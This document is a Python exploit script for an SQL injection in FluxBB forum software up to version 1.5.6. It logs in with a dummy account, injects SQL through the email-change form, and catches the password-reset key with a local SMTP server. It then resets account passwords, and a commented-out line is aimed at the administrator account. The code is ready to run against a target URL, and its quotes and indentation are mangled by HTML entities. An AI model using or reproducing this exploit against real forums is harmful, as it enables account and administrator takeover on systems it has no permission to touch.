# Friday, November 21, 2014 - secthrowaway@safe-mail.net
# FluxBB <= 1.5.6 SQL Injection
# make sure that your IP is reachable

url = &#039;http://target.tld/forum/&#039;
user = &#039;user&#039; # dummy account
pwd = &#039;test&#039;

import urllib, sys, smtpd, asyncore, re, sha
from email import message_from_string
from urllib2 import Request, urlopen

ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17
Safari/537.36"
bindip = &#039;0.0.0.0&#039;

def stage1(sql):
if len(sql) > 80:
sys.exit(&#039;SQL too long, max 80 chars&#039;)
print "1st stage: %s (%d chars)" % (sql, len(sql))
r = urlopen(Request(&#039;%sprofile.php?action=change_email&id=%s&#039; % (url, uid),
data="form_sent=1&req_new_email=%s&req_password=%s&new_email=Submit" % (urllib.quote(sql), pwd),
headers={"Referer": "%sprofile.php" % url, "User-agent": ua, "Cookie":
cookie})).read()
if &#039;An email has been sent to the specified address&#039; not in r:
sys.exit(&#039;err&#039;)

def stage3(key):
print "3rd stage, using key: %s" % key
r = urlopen(Request(&#039;%sprofile.php?action=change_pass&id=%s&key=%s&#039; % (url, uid, key),
headers={"User-agent": ua})).read()
if &#039;Your password has been updated&#039; in r:
print &#039;success&#039;
else:
print &#039;err&#039;

class stage2_smtp(smtpd.SMTPServer):
def process_message(self, peer, mailfrom, rcpttos, data):
print &#039;2nd stage: got mail&#039;, peer, mailfrom, "to:", rcpttos
key = re.search("(https?://.*&key=([^\s]+))", message_from_string(data).get_payload(decode=True),
re.MULTILINE)
if key is not None:
raise asyncore.ExitNow(key.group(2))
return

def login():
print "logging in"
r = urlopen(Request(&#039;%slogin.php?action=in&#039; % url, data="form_sent=1&req_username=%s&req_password=%s"
% (user, pwd), headers={"User-agent": ua}))
try:
t = r.info()[&#039;set-cookie&#039;].split(&#039;;&#039;)[0]
return (t.split(&#039;=&#039;)[1].split(&#039;%7C&#039;)[0], t)
except:
sys.exit(&#039;unable to login, check user/pass&#039;)

uid, cookie = login()

email_domain = urlopen(Request(&#039;http://tns.re/gen&#039;)).read()
print "using domain: %s" % email_domain

#this will change your password to your password :)
stage1(&#039;%s\&#039;/**/where/**/id=%s#@%s&#039; % (sha.new(pwd).hexdigest(), uid, email_domain))

#this will change admin&#039;s (uid=2) password "123456"
#stage1(&#039;%s\&#039;/**/where/**/id=%s#@%s&#039; % (sha.new("123456").hexdigest(), 2, email_domain))

try:
print "2nd stage: waiting for mail"
server = stage2_smtp((bindip, 25), None)
asyncore.loop()
except asyncore.ExitNow, key:
stage3(key)

